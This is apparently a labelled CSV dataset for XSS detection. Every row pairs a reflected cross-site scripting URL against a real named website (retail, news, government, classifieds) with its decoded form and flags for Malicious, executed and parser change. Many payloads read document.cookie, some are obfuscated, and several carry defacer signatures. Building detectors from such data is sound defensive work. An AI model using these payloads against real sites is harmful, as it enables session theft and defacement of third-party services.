Payloads,Class,decoded,executed,parser_changed
http://demo.shopy.biz/sr.asp?text=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://demo.shopy.biz/sr.asp?text=""><script>alert(""backdoor"")</script>",True,True
https://registration.ft.com/registration/subscription-service/register?pspurl='&gt;&lt;script&gt;alert('xss')<br>&lt;/script&gt;&lt;meta content=',Malicious,https://registration.ft.com/registration/subscription-service/register?pspurl='><script>alert('xss')</script><meta content=',True,True
http://www5.info-mapping.com/onpage/kuronekoyamato/pub/addrsrch2.asp?prfcd=37&amp;ctycd=202&amp;ctynm=%8a%db<br>%8bt%8es%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious,"http://www5.info-mapping.com/onpage/kuronekoyamato/pub/addrsrch2.asp?prfcd=37&ctycd=202&ctynm=�ۋt�s"">'><script>alert('x')</script>",True,True
http://www.alldatasheet.co.kr/view.jsp?searchword=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.alldatasheet.co.kr/view.jsp?searchword=><script>alert(""xss"")</script>",True,True
http://hsv.auburnyoungalum.org/photos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://hsv.auburnyoungalum.org/photos/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://dentalturkiye.net/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docu<br>ment.cookie)&lt;/script&gt;,Malicious,"http://dentalturkiye.net/scripts/kayit.asp?id=3558&dil=tr&page=grup.asp&results=""><script>alert(document.cookie)</script>",True,True
http://ms161.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms161.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.hbly.gov.cn/search/searchcontroller?searchword=%ba%fe%b1%b1%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.hbly.gov.cn/search/searchcontroller?searchword=����'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.istanbulsaglik.gov.tr/w/rehber/alfabetik_arama.asp?harf=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,Malicious,"http://www.istanbulsaglik.gov.tr/w/rehber/alfabetik_arama.asp?harf=""><script>alert(document.cookie)</script>",True,True
http://c2ch.net/orz/orz.cgi/z4377n/wwwww.2ch.net/f1/%22%3e'%3e'%3c%22'%3e%22%3e'%3e%3cscript%3ealert<br>(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious,"http://c2ch.net/orz/orz.cgi/z4377n/wwwww.2ch.net/f1/"">'>'<""'>"">'><script>alert(""xss by kusomiso.com"")</script>",True,True
http://www.aspcodecms.com/demo/wwwroot/default.asp?sec=64&amp;ma1=tag&amp;tag=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e,Malicious,"http://www.aspcodecms.com/demo/wwwroot/default.asp?sec=64&ma1=tag&tag=""><script>alert(document.cookie)</script><marquee><h1>xss by xados<h1></marquee>",True,True
http://www.everpower.org/includes/phpthumb.php?originalimagedata=%3cscript%3ealert(document.cookie);<br>%3c/script%3e,Malicious,http://www.everpower.org/includes/phpthumb.php?originalimagedata=<script>alert(document.cookie);</script>,True,True
http://www.gametrailers.com/screwattack.php?s=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28<br>%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%<br>2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%3<br>9%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.gametrailers.com/screwattack.php?s="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.mcli.dist.maricopa.edu/mlx/empty.php?item=2102%22%3e%3cscript%3ealert(1337)%3c/script%3e%<br>22%3e%3cscript%3ealert(%22xss%20by%20\nxylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.mcli.dist.maricopa.edu/mlx/empty.php?item=2102""><script>alert(1337)</script>""><script>alert(""xss by \nxylitol</h1></marquee>",True,True
http://kitchener.en.craigslist.ca/search/sss?query='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;,Malicious,"http://kitchener.en.craigslist.ca/search/sss?query='""><script>alert('xss');</script>",True,True
http://www.mavala.ch/indexphp.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.mavala.ch/indexphp.php?id=""><script>alert(document.cookie)</script>",True,True
http://www.abzocke-in-deutschland.de/alhobln/artmedic_cms35/index.php?page=&quot;&gt;&lt;script&gt;alert(document.<br>cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.abzocke-in-deutschland.de/alhobln/artmedic_cms35/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.tochio.net/yotakari/cgi-bin/topics/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%<br>20-%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious,"http://www.tochio.net/yotakari/cgi-bin/topics/newsboard.cgi?num=>""><script>alert('ins - unkn0wn.eu')</script>",True,True
http://www.nycvisit.com/calendar/index.cfm?pagepkey=9&amp;eventtypefkey=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.nycvisit.com/calendar/index.cfm?pagepkey=9&eventtypefkey=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.mpfn.gob.pe/prensa-detalle.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious,"http://www.mpfn.gob.pe/prensa-detalle.php?id=""><script>alert(/ar3sw0rmed/);</script>",True,True
http://ams.confex.com/ams/htsearch.cgi%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://ams.confex.com/ams/htsearch.cgi'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://fourfourgh.es.land.to/all/travel/travel+state+gov%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(<br>b(/xss/.source));%3c/script%3e,Malicious,http://fourfourgh.es.land.to/all/travel/travel state gov}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.jetixadvertising.it/search/?srctxt=+%27%22%3e%3cimg+src%3dfoo.png+onerror%3dalert(%2fxss%<br>2f)+%2f%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit=<br>go,Malicious,"http://www.jetixadvertising.it/search/?srctxt= '""><img src=foo.png onerror=alert(/xss/) /><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>&submit=go",True,True
http://www.skaitiklis.lt/index.php?a=search&amp;q=%22%3cscript%3ealert(7);%3c/script%3e,Malicious,"http://www.skaitiklis.lt/index.php?a=search&q=""<script>alert(7);</script>",True,True
http://www.elleraner-hunnen.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.elleraner-hunnen.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.sunriver-resort.com/search-results.php?site_search=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&amp;x=0&amp;y=0,Malicious,"http://www.sunriver-resort.com/search-results.php?site_search=""><script>alert(document.cookie)</script>&x=0&y=0",True,True
"http://blekko.com/tag/profile?m=1&amp;email=editpro%2540bk.ru&amp;name=&amp;desc=&amp;website=%3cscript%3ealert%28do<br>cument.cookie%29%3c/script%3e%3cimg%20src=%20http://www.tnr.com/sites/default/files/imagecache/thumb<br>nail_landing/romaniaflag.jpg%20align=center%3e%3cmarquee%20scrollamount=%223%22%3esystem%20error..we<br>ll,%20joke,%20it%27s%20only%20xss..we%20can%20see%20cross%20site%20scripting%20on%20the%20blekko%20-<br>%20web%20search%20engine.%20by%20sony.%20http://st2tea.blogspot.com%3c/marquee%3e",Malicious,"http://blekko.com/tag/profile?m=1&email=editpro@bk.ru&name=&desc=&website=<script>alert(document.cookie)</script><img src= http://www.tnr.com/sites/default/files/imagecache/thumbnail_landing/romaniaflag.jpg align=center><marquee scrollamount=""3"">system error..well, joke, it's only xss..we can see cross site scripting on the blekko - web search engine. by sony. http://st2tea.blogspot.com</marquee>",True,True
http://www.babynamenetwork.com/baby_names/alphabetical/c.cfm?gender=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious,"http://www.babynamenetwork.com/baby_names/alphabetical/c.cfm?gender=""><script>alert(""maxwel"")</script>",True,True
http://www.e-tote.com/bspa/account/index.php?op=register&amp;returl=%2fe-betting%2findex.php%22%3e'%3e%3<br>cscript%3ealert('x')%3c/script%3e,Malicious,"http://www.e-tote.com/bspa/account/index.php?op=register&returl=/e-betting/index.php"">'><script>alert('x')</script>",True,True
